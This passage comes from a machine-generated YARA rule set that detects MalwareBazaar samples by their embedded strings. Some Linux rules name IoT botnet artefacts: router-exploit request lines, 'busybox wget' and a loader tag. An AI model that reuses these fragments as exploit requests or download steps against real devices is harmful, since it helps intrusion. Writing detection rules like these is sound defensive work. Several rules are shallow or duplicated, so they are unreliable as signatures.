        $s10 = "IsProcessorFeaturePresent"
        $s11 = "GetTempPathW"
        $s12 = "GetConsoleMode"
        $s13 = "CreateFileW"
        $s14 = "GetModuleHandleA"
        $s15 = "DeleteFileW"
        $s16 = "LoadLibraryA"
        $s17 = "GetFileAttributesExW"
        $s18 = "ShellExecuteA"
        $s19 = "ReadConsoleW"
        $s20 = "GetSystemTimeAsFileTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6511KB and
        all of them
}

rule Windows_6d237fc456e1f4157a335ecf467121559ea7ae7386e54f77c73428de337f0322
{
    meta:
        description = "Auto ML: 6d237fc456e1f4157a335ecf467121559ea7ae7386e54f77c73428de337f0322"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "MSComDlg.CommonDialog"
        $s6 = "FrmWriter"
        $s7 = "FrmWriterCMD"
        $s8 = "FrmRianReset"
        $s9 = "FrmWriterF"
        $s10 = "FrmWriterFCalc"
        $s11 = "FrmWriterEdit"
        $s12 = "FrmWriterPMK"
        $s13 = "CmdExit"
        $s14 = "CmdAdd"
        $s15 = "CmdDel"
        $s16 = "CmdCreate"
        $s17 = "user32"
        $s18 = "SetMenuItem"
        $s19 = "C:\\WIN98\\SYSTEM\\MSVBVM60.DLL\\3"
        $s20 = "cmdClose"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1808KB and
        all of them
}

rule Linux_6d7749a61e35adeaf5b1b91a7a3dd60e0e02d3df1a1bc3202b66db49623f48a2
{
    meta:
        description = "Auto ML: 6d7749a61e35adeaf5b1b91a7a3dd60e0e02d3df1a1bc3202b66db49623f48a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB and
        all of them
}

rule Linux_6d78dd222b308f616abbb1a678dc6aa7cf0e01d1a364a96e8281215b870db003
{
    meta:
        description = "Auto ML: 6d78dd222b308f616abbb1a678dc6aa7cf0e01d1a364a96e8281215b870db003"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s5 = "Connection: keep-alive"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB and
        all of them
}

rule Windows_6db15c88c3b32bf630ecea4eccf08a58f54cff5b6244c45bfb5ec20dd89685b5
{
    meta:
        description = "Auto ML: 6db15c88c3b32bf630ecea4eccf08a58f54cff5b6244c45bfb5ec20dd89685b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 231KB and
        all of them
}

rule Windows_6dcb2ab8a508e8377f179587406846b088a50d0737993ed0de373c64e3fc59c0
{
    meta:
        description = "Auto ML: 6dcb2ab8a508e8377f179587406846b088a50d0737993ed0de373c64e3fc59c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "gdiplus.dll"
        $s7 = "GdiPlus.dll"
        $s8 = "user32.dll"
        $s9 = "kernel32.dll"
        $s10 = "Kernel32.dll"
        $s11 = "User32.dll"
        $s12 = "msimg32.dll"
        $s13 = "user32"
        $s14 = "Gdiplus.dll"
        $s15 = "UxTheme.dll"
        $s16 = "GdipCreateFontFamilyFromName"
        $s17 = "GdipDeleteFontFamily"
        $s18 = "GdipCreateFont"
        $s19 = "SystemParametersInfoA"
        $s20 = "GdipDeleteFont"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6616KB and
        all of them
}

rule Windows_6e32ba749fcc25458eac90bbfce5036f0a0d40a6a112c99ac63ad20ab62a6703
{
    meta:
        description = "Auto ML: 6e32ba749fcc25458eac90bbfce5036f0a0d40a6a112c99ac63ad20ab62a6703"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = "@.rsrc"
        $s5 = "shlwapi.dll"
        $s6 = "REPLACEFILEDLG"
        $s7 = "GETPASSWORD1"
        $s8 = "sfxcmd"
        $s9 = "Delete"
        $s10 = "Overwrite"
        $s11 = "Setup"
        $s12 = "TempMode"
        $s13 = "Presetup"
        $s14 = "Software\\Microsoft\\Windows\\CurrentVersion"
        $s15 = "ProgramFilesDir"
        $s16 = "Software\\WinRAR SFX"
        $s17 = "<head><meta http-equiv=\"content-type\" content=\"text/html; charset="
        $s18 = "riched32.dll"
        $s19 = "riched20.dll"
        $s20 = "COMCTL32.DLL"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1990KB and
        all of them
}

rule Windows_6e36d48c1c2132e2f2069bc973a20e4235c6761e237051b31b3558a4df938525
{
    meta:
        description = "Auto ML: 6e36d48c1c2132e2f2069bc973a20e4235c6761e237051b31b3558a4df938525"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Reflection"
        $s7 = "TargetFrameworkAttribute"
        $s8 = "System.Runtime.Versioning"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "WRECVCSF.exe"
        $s11 = "<Module>"
        $s12 = "uNCBVkfOyKsCMDyYGAqODKFprWPlNDvqCBhdIxBNVxpGsYUsQrpGti"
        $s13 = "ubGOrswmluoXhHUeHKMVwLSGmXllPZWkJcMDkMYqYEfXhwKhvVKxexXiJAcTHKXLXDNFuRuvlVxrgu"
        $s14 = "bkSKZkRVZRUpSzVyepOgieofgDLwdHqgTJFddwiNQFHfxExvpEwVr"
        $s15 = "uteWRJhMCXCZjAaoNGMQqnhICtSEtiaubbHbyMkUAopwDTtj"
        $s16 = "nfOCmdawCaYlIDSCtDUMzyDUEWbjrDVanlHGKUrKkwTSZEgaXlrpG"
        $s17 = "nsqGWsopCpwbknUOitsylFVjCYdZAXclJZdeBwhCPQgTzBlflFmudVdhWHDxPOpeNLSKKpNmMpjVYBjAmxnvlhInv"
        $s18 = "NcylBImJQYGbKypljapLOLiLjLciEZNNwRHzfeWIjqZaotGvwifrLdrBumBqfDFqKsetrpGFDhcYmHWpEh"
        $s19 = "uaRldjeDwxwTocpFizShahqCMDdqWxcZnOTtywSAlzoRtzukwWVERJpMjPZaFohyVXgZIwHmhSwbtYIMJttAbXHdYHJjWrvwS"
        $s20 = "zoWBiWInTaLzzdfCOyLUIdPNrPL"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 432KB and
        all of them
}

rule Linux_6e776fa224a6e6c1445770772c7828c6e16417431d6e1cb9ee86219204a444d8
{
    meta:
        description = "Auto ML: 6e776fa224a6e6c1445770772c7828c6e16417431d6e1cb9ee86219204a444d8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 56KB and
        all of them
}

rule Windows_6ecc88149dfdad0b296e7aee3c554fc191b1371d09c51ee2e47ac0e145ee38ba
{
    meta:
        description = "Auto ML: 6ecc88149dfdad0b296e7aee3c554fc191b1371d09c51ee2e47ac0e145ee38ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "CMDp"
        $s6 = "fseT"
        $s7 = "BWin"
        $s8 = "sHelL"
        $s9 = "seTH"
        $s10 = "OxCMd7"
        $s11 = "seTM"
        $s12 = "@wINK"
        $s13 = "LoAd"
        $s14 = "<Module>"
        $s15 = "latestbuild.exe"
        $s16 = "Writer"
        $s17 = "System"
        $s18 = "System.Collections.Generic"
        $s19 = "fileNames"
        $s20 = "fileTypes"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7227KB and
        all of them
}

rule Windows_6f6abcb56f4c896a9cbac7b27e29a787fb251cbc27bfddc133a7da934a22a41c
{
    meta:
        description = "Auto ML: 6f6abcb56f4c896a9cbac7b27e29a787fb251cbc27bfddc133a7da934a22a41c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "4FGREX.exe"
        $s6 = "System"
        $s7 = "System.Runtime.CompilerServices"
        $s8 = "System.Diagnostics"
        $s9 = "ProcessStartInfo"
        $s10 = "set_FileName"
        $s11 = "set_Arguments"
        $s12 = "ProcessWindowStyle"
        $s13 = "set_WindowStyle"
        $s14 = "set_CreateNoWindow"
        $s15 = "Process"
        $s16 = "mscoree.dll"
        $s17 = "powershell"
        $s18 = "VarFileInfo"
        $s19 = "StringFileInfo"
        $s20 = "FileDescription"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB and
        all of them
}

rule Windows_0a8839b793adedb6f3b7882cd3ff2aca653b29aefe4091969bceffae430b6eaf
{
    meta:
        description = "Auto ML: 0a8839b793adedb6f3b7882cd3ff2aca653b29aefe4091969bceffae430b6eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "map/set too long"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3139KB and
        all of them
}

rule Windows_6f8caef6d2e919940e8983a1fc994e26b2d4caf270b6c5ca722a99e431a21eda
{
    meta:
        description = "Auto ML: 6f8caef6d2e919940e8983a1fc994e26b2d4caf270b6c5ca722a99e431a21eda"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2130KB and
        all of them
}

rule Windows_6fc264d3ffc563ee44ae41f7693c1ec08d3d57e19b69b6e59c0a300c7317135c
{
    meta:
        description = "Auto ML: 6fc264d3ffc563ee44ae41f7693c1ec08d3d57e19b69b6e59c0a300c7317135c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "CMDH#"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Reflection"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "System.Security"
        $s14 = "SecurityRuleSet"
        $s15 = "neuralnetwork_for_generating_postcards_with_text.exe"
        $s16 = "<Module>"
        $s17 = "ThreadSafeObjectProvider`1"
        $s18 = "MySettings"
        $s19 = "ApplicationSettingsBase"
        $s20 = "System.Configuration"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5975KB and
        all of them
}

rule Linux_6fc3c3b2019f7b45b78e623adc872986817da0427d273a9bb04c0c44ed8befc6
{
    meta:
        description = "Auto ML: 6fc3c3b2019f7b45b78e623adc872986817da0427d273a9bb04c0c44ed8befc6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 146KB and
        all of them
}

rule Windows_6fcb2b9e055ed80a6cd600c7c211d8c2d9dcaa959fdf525dd02ac0685a4d6827
{
    meta:
        description = "Auto ML: 6fcb2b9e055ed80a6cd600c7c211d8c2d9dcaa959fdf525dd02ac0685a4d6827"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "get_WYmZ"
        $s11 = "getInstancia"
        $s12 = "get_paginaWebEmpresa"
        $s13 = "set_paginaWebEmpresa"
        $s14 = "get_razonSocialEmpresa"
        $s15 = "set_razonSocialEmpresa"
        $s16 = "get_direccionEmpresa"
        $s17 = "set_direccionEmpresa"
        $s18 = "get_correoEmpresa"
        $s19 = "set_correoEmpresa"
        $s20 = "get_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 935KB and
        all of them
}

rule Windows_6fd198ca0bf7ba6b2e2dcb365bec8b647a8f49e7a44be1aa610b15e17363e7f0
{
    meta:
        description = "Auto ML: 6fd198ca0bf7ba6b2e2dcb365bec8b647a8f49e7a44be1aa610b15e17363e7f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "https://d.symcb.com/cps0%"
        $s4 = "https://d.symcb.com/rpa0."
        $s5 = "http://s.symcd.com06"
        $s6 = "%http://s.symcb.com/universal-root.crl0"
        $s7 = "https://d.symcb.com/rpa0@"
        $s8 = "/http://ts-crl.ws.symantec.com/sha256-tss-ca.crl0"
        $s9 = "http://ts-ocsp.ws.symantec.com0;"
        $s10 = "/http://ts-aia.ws.symantec.com/sha256-tss-ca.cer0("
        $s11 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s12 = "http://pki-ocsp.symauth.com0"
        $s13 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s14 = "kernel32.dll"
        $s15 = "user32.dll"
        $s16 = "advapi32.dll"
        $s17 = "oleaut32.dll"
        $s18 = "shell32.dll"
        $s19 = "version.dll"
        $s20 = "mscoree.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5788KB and
        all of them
}

rule Windows_6fd61c75d3e5cc9c34e1ef147f0e82ff7748ca3ecc752600c977db5482f71743
{
    meta:
        description = "Auto ML: 6fd61c75d3e5cc9c34e1ef147f0e82ff7748ca3ecc752600c977db5482f71743"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1457KB and
        all of them
}

rule Windows_6fd650e4f7d88a81503ca6a6ba8d21abbdd0a6d14086bfff03d1b5cc89625eaf
{
    meta:
        description = "Auto ML: 6fd650e4f7d88a81503ca6a6ba8d21abbdd0a6d14086bfff03d1b5cc89625eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "GetNativeSystemInf"
        $s3 = "V-.kernel32.dl%"
        $s4 = "LoadA5AddQ"
        $s5 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\"/>"
        $s6 = "KERNEL32.DLL"
        $s7 = "ADVAPI32.dll"
        $s8 = "COMCTL32.dll"
        $s9 = "COMDLG32.dll"
        $s10 = "IPHLPAPI.DLL"
        $s11 = "OLEAUT32.dll"
        $s12 = "PSAPI.DLL"
        $s13 = "SHELL32.dll"
        $s14 = "USER32.dll"
        $s15 = "USERENV.dll"
        $s16 = "UxTheme.dll"
        $s17 = "VERSION.dll"
        $s18 = "WININET.dll"
        $s19 = "WINMM.dll"
        $s20 = "WSOCK32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 769KB and
        all of them
}

rule Windows_6fdc568249d2e7188833bc95d9c396b22adf78abecd61b636a33c148d08faf59
{
    meta:
        description = "Auto ML: 6fdc568249d2e7188833bc95d9c396b22adf78abecd61b636a33c148d08faf59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_6fef4ce5e0eab33c6ac840108036d53b6a8705f43ff4296f42331f2812c8ac72
{
    meta:
        description = "Auto ML: 6fef4ce5e0eab33c6ac840108036d53b6a8705f43ff4296f42331f2812c8ac72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "- unable to open console device"
        $s6 = "- unexpected multithread lock error"
        $s7 = "- not enough space for thread data"
        $s8 = "- floating point not loaded"
        $s9 = "GetLastActivePopup"
        $s10 = "GetActiveWindow"
        $s11 = "user32.dll"
        $s12 = "OLEAUT32.dll"
        $s13 = "ShowWindow"
        $s14 = "DestroyWindow"
        $s15 = "LoadStringA"
        $s16 = "LoadStringW"
        $s17 = "SetWindowTextA"
        $s18 = "SetWindowTextW"
        $s19 = "GetWindowLongA"
        $s20 = "SetWindowLongA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7451KB and
        all of them
}

rule Windows_6ff9daa15f841bf3600d5a9174ab11b921ca8e8f1c9017a1c18afeb514c0f72e
{
    meta:
        description = "Auto ML: 6ff9daa15f841bf3600d5a9174ab11b921ca8e8f1c9017a1c18afeb514c0f72e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-AutoHideStripBase-Tab>-GetEnumerator>d__0"
        $s5 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-DockPaneStripBase-Tab>-GetEnumerator>d__0"
        $s6 = "<System-Collections-IEnumerable-GetEnumerator>d__1"
        $s7 = "ReadOnlyCollection`1"
        $s8 = "get_DataTable1"
        $s9 = "get_DataColumn1"
        $s10 = "set_DataColumn1"
        $s11 = "get_DockPanel_Persistor_XmlFileComment1"
        $s12 = "<get_Documents>d__112"
        $s13 = "System.WindowsBitmap.Docking.Win32"
        $s14 = "ReadInt32"
        $s15 = "get_DockPanel_Persistor_XmlFileComment2"
        $s16 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-AutoHideStripBase-Pane>-GetEnumerator>d__15"
        $s17 = "<System-Collections-IEnumerable-GetEnumerator>d__16"
        $s18 = "<Module>"
        $s19 = "System.Drawing.Drawing2D"
        $s20 = "WM_USERCHANGED"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 834KB and
        all of them
}

rule Windows_0ae99771b8e18f1a7963123b64056ac6c2e93ef0bcec40297a5c1f92ab70887b
{
    meta:
        description = "Auto ML: 0ae99771b8e18f1a7963123b64056ac6c2e93ef0bcec40297a5c1f92ab70887b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_7014b6b3754d3c7c16c27520eabd722119df9575c4f11b2c48d0df1d8eb0b191
{
    meta:
        description = "Auto ML: 7014b6b3754d3c7c16c27520eabd722119df9575c4f11b2c48d0df1d8eb0b191"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "CorExitProcess"
        $s6 = "FlsGetValue"
        $s7 = "FlsSetValue"
        $s8 = "CreateEventExW"
        $s9 = "CreateSemaphoreExW"
        $s10 = "SetThreadStackGuarantee"
        $s11 = "CreateThreadpoolTimer"
        $s12 = "SetThreadpoolTimer"
        $s13 = "WaitForThreadpoolTimerCallbacks"
        $s14 = "CloseThreadpoolTimer"
        $s15 = "CreateThreadpoolWait"
        $s16 = "SetThreadpoolWait"
        $s17 = "CloseThreadpoolWait"
        $s18 = "FlushProcessWriteBuffers"
        $s19 = "GetCurrentProcessorNumber"
        $s20 = "GetLogicalProcessorInformation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 633KB and
        all of them
}

rule Linux_701e55988e5409acc81d6e19f08879a3fecdc96bc5d0981c4caac65d7529a0f5
{
    meta:
        description = "Auto ML: 701e55988e5409acc81d6e19f08879a3fecdc96bc5d0981c4caac65d7529a0f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s2 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s4 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s5 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s6 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s7 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s8 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s9 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s10 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s11 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s12 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s13 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s15 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
        $s16 = "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)"
